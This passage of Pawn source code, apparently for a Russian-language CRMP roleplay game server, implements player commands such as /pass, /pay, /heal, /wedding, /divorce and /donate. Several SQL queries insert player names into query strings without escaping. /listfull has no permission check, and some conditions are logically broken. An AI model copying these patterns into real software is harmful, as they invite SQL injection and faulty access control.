	(!g_player_skills[playerid][S_LICS][0]) ? ("Нет"):("Есть"),
	(!g_player_skills[playerid][S_LICS][2]) ? ("Нет"):("Есть"),
	(!g_player_skills[playerid][S_LICS][3]) ? ("Нет"):("Есть"),
	(!g_player_skills[playerid][S_LICS][1]) ? ("Нет"):("Есть"));
	ShowPlayerDialog(params[0], D_NULL, DIALOG_STYLE_MSGBOX, string, string_dialogue, "Закрыть", "");
	if(PI[playerid][pSex] == 1) format(string, sizeof(string), "показал свои лицензии %s", GetName(params[0]));
	else format(string, sizeof(string), "показала свои лицензии %s", GetName(params[0]));
	MeAction(playerid, string);
	return 1;
}

CMD:pass(playerid, params[])
{
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xf6e58dAA, "Используйте: {FFFFFF}Введите: /pass [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	new text[20], mtext[MAX_PLAYER_NAME];
	if(PI[playerid][pMarried] == 0) format(mtext, sizeof(mtext), "Нет");
	else format(mtext, sizeof(mtext), "%s", PI[playerid][pWhoMarried]);
	if(PI[playerid][pPhoneNumber] <= 1) format(text, sizeof(text), "Не имеется");
	else format(text, sizeof(text), "%i", PI[playerid][pPhoneNumber]);
	new fmt_str[64];

	STRING_GLOBAL[0] = EOS; //Егор
	strcat(STRING_GLOBAL, "{FFFFFF}");
	format(fmt_str, sizeof(fmt_str), "Имя: %s\n", GetName(playerid));
	strcat(STRING_GLOBAL, fmt_str);
	format(fmt_str, sizeof(fmt_str), "Проживание в стране: %i\n", PI[playerid][pLevel]);
	strcat(STRING_GLOBAL, fmt_str);
	format(fmt_str, sizeof(fmt_str), "Телефон: %s\n", text);
	strcat(STRING_GLOBAL, fmt_str);
	format(fmt_str, sizeof(fmt_str), "Брак: %s\n", mtext);
	strcat(STRING_GLOBAL, fmt_str);
	format(fmt_str, sizeof(fmt_str), "Военный билет: %s\n", (PI[playerid][pVoennik]) ? ("Имеется") : ("Не имеется"));
	strcat(STRING_GLOBAL, fmt_str);
	format(fmt_str, sizeof(fmt_str), "Организация: %s\n", Fraction_Name[PI[playerid][pMember]]);
	strcat(STRING_GLOBAL, fmt_str);
	format(fmt_str, sizeof(fmt_str), "Должность: %s(%d)", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]],PI[playerid][pRank]);
	strcat(STRING_GLOBAL, fmt_str);
	ShowPlayerDialog(params[0], D_NULL, DIALOG_STYLE_MSGBOX, "Паспорт", STRING_GLOBAL, "Закрыть", "");
 	new string[64];
	SendMes(playerid, COLOR_WHITE, "Вы показали свой паспорт %s [%d]", GetName(params[0]),params[0]);
	format(string, sizeof(string), "___________[ ПАСПОРТ №%d ]___________", PI[playerid][pID]);
	SendClientMessage(params[0],COLOR_WHITE, string);
	SendMes(params[0], COLOR_WHITE, "Имя Фамилия: %s | Годы проживания: %d ",PI[playerid][pName],PI[playerid][pLevel]);
	SendMes(params[0], COLOR_WHITE, "Телефонный номер: %d | Уровень розыска: %d",text,PI[playerid][pWanted]);
	SendMes(params[0], COLOR_WHITE, "Военный билет: %s | Организация: %s",(PI[playerid][pVoennik])?("Есть"):("Нет"), Fraction_Name[PI[playerid][pMember]]);
	SendMes(params[0], COLOR_WHITE, "Должность: %s(%d)",Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]],PI[playerid][pRank]);
	SendClientMessage(params[0],COLOR_WHITE, "_________________________________");
	if(PI[playerid][pSex] == 1) format(fmt_str, sizeof(fmt_str), "показал свой паспорт %s", GetName(params[0]));
	else format(fmt_str, sizeof(fmt_str), "показалa свой паспорт %s", GetName(params[0]));
	MeAction(playerid, fmt_str);
	return 1;
}

CMD:diplom(playerid, params[])
{
    if(PI[playerid][pWatch] <= 1) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет диплома");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /diplom [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	new string[64], string_dialogue[128];
	format(string, sizeof(string), "{FFFFFF}Имя: %s\n\n", GetName(playerid));
	strcat(string_dialogue, string);
	format(string, sizeof(string), "{FFFFFF}Диплом: имеется\n\n");
	strcat(string_dialogue, string);
	format(string, sizeof(string), "{FFFFFF}Выдан: Нижегородский Гос. Университет");
	strcat(string_dialogue, string);
	ShowPlayerDialog(params[0], D_NULL, DIALOG_STYLE_MSGBOX, "Диплом", string_dialogue, "Закрыть", "");
	if(PI[playerid][pSex] == 1) format(string, sizeof(string), "показал свой диплом %s", GetName(params[0]));
	else format(string, sizeof(string), "показалa свой диплом %s", GetName(params[0]));
	MeAction(playerid, string);
	return 1;
}

CMD:med(playerid, params[])
{
    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /med [id игрока]");
    else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
    new med_status[25], gender_text[8];
	switch(PhoneNumbers[playerid][2])
	{
	    case 0: return SendClientMessage(playerid, COLOR_GREY, "У Вас нет мед. карты");
	   	case 1: med_status = "не определен";
	   	case 2: med_status = "психически не здоров(-а)";
	   	case 3: med_status = "наблюдаются отклонения";
	   	case 4: med_status = "полностью здоровый(-ая)";
	}
	if(PI[playerid][pSex] == 1) gender_text = "Мужчина";
	else if(PI[playerid][pSex] == 2) gender_text = "Женщина";
	new string[64], string_dialogue[300];
	strcat(string_dialogue, "{FFFFFF}");
	format(string, sizeof(string), "Имя: %s\n", GetName(playerid));
	strcat(string_dialogue, string);
	format(string, sizeof(string), "Возраст: %d\n", PI[playerid][pAge]);
	strcat(string_dialogue, string);
	format(string, sizeof(string), "Пол: %s\n", gender_text);
	strcat(string_dialogue, string);
	format(string, sizeof(string), "Статус: %s\n", med_status);
	strcat(string_dialogue, string);
	ShowPlayerDialog(params[0], D_NULL, DIALOG_STYLE_MSGBOX, "Мед. карта", string_dialogue, "Закрыть", "");
	if(PI[playerid][pSex] == 1) format(string, sizeof(string), "показал свою мед. карту %s", GetName(params[0]));
	else format(string, sizeof(string), "показалa свою мед. карту %s", GetName(params[0]));
	MeAction(playerid, string);
	return true;
}

CMD:eject(playerid, params[])
{
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в транспорте!");
	else if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем транспорт!");
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /eject [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь выкинуть себя!");
	else if(!IsPlayerInVehicle(params[0],GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться в вашем транспорте!");
	SendMes(playerid, COLOR_LIGHTBLUE, "Вы выкинули из транспорта %s", GetName(params[0]));
	SendMes(params[0], COLOR_LIGHTBLUE, "%s выкинул Вас из транспорта", GetName(playerid));
	PlayerFreezed[params[0]] = false;
	TogglePlayerControllable(params[0], 1);
	new string[100];
	format(string, sizeof(string), "выкинул из транспорта %s", GetName(params[0]));
	MeAction(playerid, string);
	RemovePlayerFromVehicle(params[0]);
	return 1;
}

CMD:payday(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 7) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	PayDay();
	return 1;
}

CMD:gcontrol(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 6) return 1;

	if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	ShowDialogGhetto(playerid);

	return 1;
}

CMD:pay(playerid, params[])
{
	if(GetPVarInt(playerid, "payer") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Передавать деньги можно раз в пять секунд");

	if(PI[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_GREY, "Передача денег разрешена со второго уровня.");
	extract params -> new to_player, cash; else return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /pay [id игрока] [сумма]");

	if(!IsPlayerConnected(to_player) || !PlayerLogged[to_player] || playerid == to_player)
		return SendClientMessage(playerid, C_RED, "Такого игрока нет");

	if(!IsPlayerInRangeOfPlayer(6.0, playerid, to_player))
		return SendClientMessage(playerid, 0x999999FF, "Игрок находится далеко от Вас");

	if(PI[playerid][pLevel] > 1 && cash > 5000)
		return SendClientMessage(playerid, C_RED, "Передать больше 5.000 рублей только с 1 уровня");

	if(PI[playerid][pLevel] > 2 && cash > 10000)
		return SendClientMessage(playerid, C_RED, "Передать больше 10.000 рублей только с 2 уровня");

	if(!(0 < cash < GetMoney(playerid)))
		return SendMess(playerid, MSG_NOT_MONEY);

	if(GetMoney(to_player) + cash > 999999999)
		return SendClientMessage(playerid, C_RED, "Больше 1000000000 рублей запрещено иметь на руках");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "+%d", cash);
	SetPlayerChatBubble(to_player, STRING_GLOBAL, 0x00CC00FF, 10.0, 5000);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "-%d", cash);
	SetPlayerChatBubble(playerid, STRING_GLOBAL, 0xFF6600FF, 10.0, 5000);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s передал Вам деньги %d руб", GetName(playerid), cash);
	SendClientMessage(to_player, C_BLUE, STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы передали игроку %s деньги %d руб", GetName(to_player), cash);
	SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

	GiveMoney(playerid, -cash);
	GiveMoney(to_player, cash);

	SetPVarInt(playerid, "payer", gettime()+5);

	return 1;
}

CMD:heal(playerid, params[])
{
	if(!IsAMedic(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	if(IsPlayerInRangeOfPoint(playerid,70.0,1615.5790,1209.4127,2513.4299) && IsAMedic(playerid))
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /heal [id игрока]");
		else if(!Medicines[playerid]) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет с собой медикаментов!");
		//else if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете вылечить себя!");
		else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(!IsPlayerInRangeOfPlayer(5.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
		new Float:shealth;
		GetPlayerHealth(params[0], shealth);
		if(shealth >= 100.0) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок здоров!");
		SendMes(playerid, COLOR_BLUE, "Вы предложили %s вылечиться за %iр", GetName(params[0]), MP1[5]);
		SendMes(params[0], COLOR_BLUE, "%s %s предложил Вам вылечиться за %iр", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), MP1[5]);
		SendMess(params[0], MSG_PLAYER_ACCESS);
		SetPVarInt(params[0], "PlayerHeal", playerid);
		SetPVarInt(params[0], "MoneyHeal", MP1[5]);
		SetPVarInt(params[0], "KeyHeal", 1);
        if(PlayerDied[params[0]] == true)
		{
			PI[params[0]][pBed] = 0;
			PI[params[0]][pCity] = 0;
			PlayerDied[params[0]] = false;
			MysqlUpdatePlayerInt(params[0], "city", PI[params[0]][pCity]);
			MysqlUpdatePlayerInt(params[0], "bed", PI[params[0]][pBed]);
		}
	}
	else if(IsPlayerInAnyVehicle(playerid))
	{
	    new vehid = GetPlayerVehicleID(playerid);
	   	if(GetVehicleModel(vehid) != 416 || GetVehicleModel(vehid) != 563)
	   	{
	   	    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /heal [id игрока]");
	   	    else if(!Medicines[playerid]) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет с собой медикаментов!");
			else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
			else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
			else if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете вылечить себя!");
			else if(!IsPlayerInVehicle(params[0], GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться с вами в транспорте!");
			new Float:shealth;
			GetPlayerHealth(params[0], shealth);
			if(shealth >= 100.0) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок здоров!");
			SendMes(playerid, COLOR_BLUE, "Вы предложили вылечить %s за %iр", GetName(params[0]), MP1[5]);
			SendMes(params[0], COLOR_BLUE, "%s %s предложил Вам вылечиться за %iр", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), MP1[5]);
			SendMess(params[0], MSG_PLAYER_ACCESS);
			SetPVarInt(params[0], "PlayerHeal", playerid);
			SetPVarInt(params[0], "MoneyHeal", MP1[5]);
			SetPVarInt(params[0], "KeyHeal", 1);
	   	}
	   	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в специализированном транспорте!");
	}
	return 1;
}

CMD:ctune(playerid)
{
	if(!GetPVarInt(playerid, "UsedCTO")) return 0;
    new bizzid = GetPVarInt(playerid,"CTObizzid");
	if(GetPlayerState(playerid) != 2) return SKick(playerid, 12221);
	new pveh = GetPlayerVehicleID(playerid);
	SetVehiclePos(pveh,BizzInfo[bizzid][bEntrx],BizzInfo[bizzid][bEntry],BizzInfo[bizzid][bEntrz]);
	DeletePVar(playerid,"UsedCTO");
	SetVehicleZAngle(pveh,270.9845);
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);
	SetVehicleVirtualWorld(pveh,0);
	LinkVehicleToInterior(pveh,0);
	PutPlayerInVehicle(playerid, pveh, 0);
	TogglePlayerControllable(playerid,true);
	SetCameraBehindPlayer(playerid);
	PlayerMenuExit(playerid);
	return 1;
}

CMD:healing(playerid, params[])
{
	new full = 0;
	for(new i = TOTALHOUSE; i > 0; i --)
	{
		if(IsPlayerInRangeOfPoint(playerid, 60.0, HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
		{
			if(HouseInfo[i][hVirtual] == GetPlayerVirtualWorld(playerid))
			{
				if(HouseInfo[i][hHeal] == 0) return SendClientMessage(playerid, COLOR_GREY, "В доме нет аптечек!");
				new Float:shealth;
				GetPlayerHealth(playerid, shealth);
				if(shealth >= 100) return SendClientMessage(playerid, COLOR_GREY, "Вы не нуждаетесь в лечении!");
				HouseInfo[i][hHeal]--;
				MysqlUpdateHouseInt(i, "hHeal", HouseInfo[i][hHeal]);
				SetHealth(playerid, shealth+25);
				GetPlayerHealth(playerid, shealth);
				if(shealth > 100) SetHealth(playerid, 100);
				SendMes(playerid, COLOR_BLUE, "Вы использовали 1 аптечку. Осталось %i аптечек", HouseInfo[i][hHeal]);
				MeAction(playerid, "использовал аптечку");
				full++;
			}
		}
	}
	if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в доме!");
	return 1;
}

CMD:afk(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new list,full,str[100];
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pAFK] >= 3) list++;
	}
	STRING_GLOBAL[0] = EOS;
	format(str,sizeof(str),"{FF6347}Всего в AFK - %i игрок(ов)\n\n",list);
	strcat(STRING_GLOBAL, str);
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pAFK] >= 3)
		{
			format(str,sizeof(str),"{ffffff}%s[%i] - {FF6347}AFK: %s\n",GetName(i), i, Converts(PI[i][pAFK]));
			strcat(STRING_GLOBAL, str);
			full++;
		}
	}
	if(full == 0) strcat(STRING_GLOBAL, "{ffffff}Информация не найдена");
	ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"{ffffff}AFK", STRING_GLOBAL,"STRING_GLOBAL","");
	return 1;
}

CMD:listfull(playerid)
{

	new text[900],
 	fmt_str[100],
  	name[32];

	mysql_query(dbHandle, "SELECT * FROM fullaccess");

    strcat(text, "");

    for(new i = 0; i < cache_num_rows(); i ++)
    {
        cache_get_field_content(i, "name", name);

        format
        (
            fmt_str, sizeof fmt_str,
            "%s\n",
            name
        );

        strcat(text, fmt_str);
    }
	SPD
	(
		playerid, D_NULL, DIALOG_STYLE_LIST,
		"{FFCC00}Список ФД",
	 	text,
  		"Закрыть", ""
 	);
	return 1;
}

CMD:wanted(playerid, params[])
{
	if(!IsACop(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	new full, str[150];

	STRING_GLOBAL[0] = EOS;
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pWanted] > 0)
		{
			format(str,sizeof(str),"{ffff00}%s - {ffffff}Звезд: {ffff00}%i, {ffffff}обвинение: {ffff00}%s, {ffffff}доложил: {ffff00}%s\n",GetName(i), PI[i][pWanted], PI[i][pWantedReason], PI[i][pWantedWho]);
			strcat(STRING_GLOBAL, str);
			full++;
		}
	}
	if(full == 0) strcat(STRING_GLOBAL, "Информация не найдена");
	ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"Внимание, в розыске!", STRING_GLOBAL,"Закрыть","");
	return 1;
}

CMD:wedding(playerid, params[])
{
	if(PI[playerid][pMarried] == 1) return SendClientMessage(playerid, COLOR_GREY, "Вы уже связаны узами брака!");
	else if(!IsPlayerInRangeOfPoint(playerid,5.0,105.0641,2895.8247,1010.6396)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться у ЗАГС'а!");
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /wedding [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь заключить брак сам с собой!");
	else if(!IsPlayerInRangeOfPlayer(5.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	else if(PI[params[0]][pMarried] == 1) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже связан узами брака!");
	new string[128];
	format(string, sizeof(string), "Вы предложили %s заключить брачный договор", GetName(params[0]));
	SendClientMessage(playerid, COLOR_BLUE, string);
	if(PI[playerid][pSex] == 1)
	{
	    format(string, sizeof(string), "%s предложил Вам заключить брачный договор", GetName(playerid));
		SendClientMessage(params[0], COLOR_BLUE, string);
		format(string, sizeof(string), "{FFFFFF}%s предложил Вам заключить брачный договор\n\nВы согласны?", GetName(playerid));
		ShowPlayerDialog(params[0], D_HEAL+19, 0, "{FF6666}Свадьба", string, "Да", "Нет");
	}
	else
	{
	    format(string, sizeof(string), "%s предложила Вам заключить брачный договор", GetName(playerid));
		SendClientMessage(params[0], COLOR_BLUE, string);
	    format(string, sizeof(string), "{FFFFFF}%s предложила Вам заключить брачный договоре\n\nВы согласны?", GetName(playerid));
		ShowPlayerDialog(params[0], D_HEAL+19, 0, "{FF6666}Свадьба", string, "Да", "Нет");
	}
	SetPVarInt(params[0], "PlayerMarriage", playerid);
	return 1;
}

CMD:divorce(playerid, params[])
{
	if(PI[playerid][pMarried] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не связаны узами брака!");
	else if(!IsPlayerInRangeOfPoint(playerid, 5.0,105.0641,2895.8247,1010.6396)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться у церкви!");
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /divorce [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь разорвать брак сам с собой!");
	else if(!IsPlayerInRangeOfPlayer(5.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	if(!strcmp(GetName(params[0]), PI[playerid][pWhoMarried], true))
	{
	    new string[128];
	    format(string, sizeof(string), "Вы предложили %s развестись", GetName(params[0]));
	    SendClientMessage(playerid, COLOR_BLUE, string);
	    if(PI[playerid][pSex] == 1)
	    {
	        format(string, sizeof(string), "%s предложил Вам развестись", GetName(playerid));
	        SendClientMessage(params[0], COLOR_BLUE, string);
	        format(string, sizeof(string), "{FFFFFF}%s предложил Вам развестись\n\nВы согласны?", GetName(playerid));
			ShowPlayerDialog(params[0], D_HEAL+20, 0, "{F04245}Развод", string, "Да", "Нет");
	    }
	    else
	    {
	        format(string, sizeof(string), "%s предложила Вам развестись", GetName(playerid));
	        SendClientMessage(params[0], COLOR_BLUE, string);
	        format(string, sizeof(string), "{FFFFFF}%s предложила Вам развестись\n\nВы согласны?", GetName(playerid));
			ShowPlayerDialog(params[0], D_HEAL+20, 0, "{F04245}Развод", string, "Да", "Нет");
	    }
		SetPVarInt(params[0], "PlayerMarriage", playerid);
	}
	else SendClientMessage(playerid, COLOR_GREY, "Игрок не связам узами брака с вами!");
	return 1;
}

CMD:offdivorce(playerid, params[])
{
	if(PI[playerid][pMarried] == 0)
		return SendClientMessage(playerid, C_RED, "Вы не связаны узами брака");

	new rows;
	new Cache: result;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT whomarried FROM accounts WHERE id=%d", PI[playerid][pID]);
	result = mysql_query(dbHandle, STRING_GLOBAL);

	rows = cache_num_rows();

	if(rows)
	{
		new whomarried[24];
		cache_get_field_content(0, "whomarried", whomarried, dbHandle, 24);

		if(GetPlayerID(whomarried) != INVALID_PLAYER_ID)
			return SendClientMessage(playerid, C_RED, "Игрок в сети");

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET married=0, whomarried='None' WHERE name='%s' AND name='%s'", GetName(playerid), whomarried);
		mysql_query(dbHandle, STRING_GLOBAL);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно развелись с %s", whomarried);
		SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

		cache_delete(result);
	}

	return 1;
}
CMD:donate(playerid)
{
 	CloseInventory(playerid);
	STRING_GLOBAL[0] = EOS;

	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"\n{ffd83d}Допольнительные услуги{ffffff} - раздел в котором вы можете просмотреть и\n"\
		"использовать дополнительные услуги сервера\n\n"\
		"{ffd83d}Донат{ffffff} - Ваши пожертвования реальными деньгами на работу и развития сервера.\n"\
		"Взамен этого, Вы получаете RUB валюту для обмены на сервера\n\n"\
		"{37c268}Курс обмена на данный момент 1 RUB - 750 игровых(без учета x2 акции)\n\n"\
		"{ffffff}Пополнить счет {37c268}www.Cromulent-crmp.ru (Раздел Донат)\n\n"\
		"{ffffff}Номер вашего аккаунта:\t\t{ffd83d}%d\n"\
		"{ffffff}Ваш никнейм:\t\t\t\t{ffd83d}%s\n"\
		"{FFFFFF}Текущее состояние вашего счета:\t{ffd83d}%d RUB",
		PI[playerid][pID],
	 	PI[playerid][pName],
		PI[playerid][pCredits]
	);
	ShowPlayerDialog(playerid, D_DONATE, DIALOG_STYLE_MSGBOX, "{ffd83d}Дополнительные услуги", STRING_GLOBAL, "Далее", "Отмена");
	return 1;
}

CMD:adivorce(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /adivorce [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[params[0]][pMarried] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не связан узами брака!");
	new targetid;
	sscanf(PI[params[0]][pWhoMarried], "u", targetid);
	if(IsPlayerConnected(targetid))
	{
		SendMes(targetid, COLOR_GREEN, "Администратор %s развел Вас с %s", GetName(playerid), PI[targetid][pWhoMarried]);
		strmid(PI[targetid][pWhoMarried], "None", 0, strlen("None"), MAX_PLAYER_NAME);
		PI[targetid][pMarried] = 0;
		MysqlUpdatePlayerInt(targetid, "married", PI[targetid][pMarried]);
		MysqlUpdatePlayerStr(targetid, "whomarried", PI[targetid][pWhoMarried]);
	}
	else
	{
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL,sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE name = '%s'",PI[params[0]][pWhoMarried]);
		mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerDivorce", "i", params[0]);
	}
	SendMes(playerid, COLOR_LIME, "Вы развели игрока %s и %s", GetName(params[0]), PI[params[0]][pWhoMarried]);
	SendMes(params[0], COLOR_GREEN, "Администратор %s развел тебя с %s", GetName(playerid), PI[targetid][pWhoMarried]);
	strmid(PI[params[0]][pWhoMarried], "None", 0, strlen("None"), MAX_PLAYER_NAME);
	PI[params[0]][pMarried] = 0;
	MysqlUpdatePlayerInt(params[0], "married", PI[params[0]][pMarried]);
	MysqlUpdatePlayerStr(params[0], "whomarried", PI[params[0]][pWhoMarried]);
	return 1;
}

forward OnPlayerDivorce(targetid);
public OnPlayerDivorce(targetid)
{
    new rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL,sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET married = 0, whomarried = None WHERE name = '%s'",PI[targetid][pWhoMarried]);
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	return 1;
}

CMD:rtune(playerid, params[])
{
	if(!PI[playerid][pVip]) return SendClientMessage(playerid, COLOR_GREY, "Вы не имеете VIP статус");

	if(!GetPlayerOwnableCar(playerid))
		return SendClientMessage(playerid, C_RED, "У Вас нет личного транспорта");

	if(!IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в транспорте!");

	new vehicleid = GetPlayerVehicleID(playerid);

	if(GetVehicleData(vehicleid, veh_owner_id) == playerid)
	{
		for(new i = 0; i < 14; i++) g_vehicle[vehicleid][veh_coms][i] = 0;
		g_vehicle[vehicleid][veh_paintjob] = 3;

		format(g_vehicle[vehicleid][veh_com], 64, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
		g_vehicle[vehicleid][veh_coms][0],g_vehicle[vehicleid][veh_coms][1],g_vehicle[vehicleid][veh_coms][2],
		g_vehicle[vehicleid][veh_coms][3],g_vehicle[vehicleid][veh_coms][4],g_vehicle[vehicleid][veh_coms][5],
		g_vehicle[vehicleid][veh_coms][6],g_vehicle[vehicleid][veh_coms][7],g_vehicle[vehicleid][veh_coms][8],
		g_vehicle[vehicleid][veh_coms][9],g_vehicle[vehicleid][veh_coms][10],g_vehicle[vehicleid][veh_coms][11],
		g_vehicle[vehicleid][veh_coms][12],g_vehicle[vehicleid][veh_coms][13]);

		SaveVehicleTuning(playerid);

